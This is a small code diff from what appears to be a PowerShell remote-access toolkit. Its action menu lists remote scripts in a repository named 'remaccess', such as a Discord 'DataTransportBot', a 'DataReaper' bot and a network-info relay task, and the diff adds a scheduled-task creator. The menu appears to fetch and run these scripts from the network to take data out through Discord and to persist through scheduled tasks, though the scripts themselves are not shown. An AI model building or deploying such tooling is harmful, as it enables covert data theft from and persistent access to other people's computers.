@@ -42,6 +42,7 @@ function Show-ActionMenu {
 $actions = @(
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/DiscordBots/DiscordDataTransportBot.ps1",
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/DiscordBots/DiscordAutoDataReaperBots.ps1"
+    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/DiscordBots/PingTaskSchedulerCreator.ps1",
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/DiscordBots/PingTaskForNetworkInfoRelay.ps1",
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/DiscordBots/PingTasksCleanup.ps1"
     
